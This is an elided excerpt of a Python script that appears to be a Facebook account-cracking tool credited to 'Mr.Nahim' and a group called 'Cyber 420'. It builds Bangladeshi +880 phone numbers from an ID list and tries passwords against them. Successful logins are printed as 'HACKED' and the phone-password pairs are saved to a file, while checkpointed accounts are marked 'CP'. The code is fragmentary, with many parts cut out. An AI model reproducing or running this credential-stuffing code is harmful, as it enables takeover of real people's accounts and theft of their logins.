...
print("\033[0;91mThis Tool's Free By Mr.Nahim")
...
def menu():
    ...
    print '\033[0;96mTEAM   : Cyber 420 The Silent Killer'
    print '\033[0;96mCREW   : Araf Er Mare xudi di Run suru'
    print ''
    ...
    print '\033[0;93m[4]  \x1b[1;92mBanglalink'
...
def action():
    ...
    if bch == '':
        ...
        print''
        try:
            c = raw_input('\033[0;94mChoose Code : ')
            k = '+880'
            idlist = '.txt'
        ...
        print''
        try:
            c = raw_input('\033[0;95mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        print''
        try:
            c = raw_input('\033[0;96mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        print''
        try:
            c = raw_input('\033[0;31mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        ...
        print''
        try:
            c = raw_input('\033[0;32mChoose Code : ')
            k = '+880'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Mr.Nahim-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Mr.Nahim-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
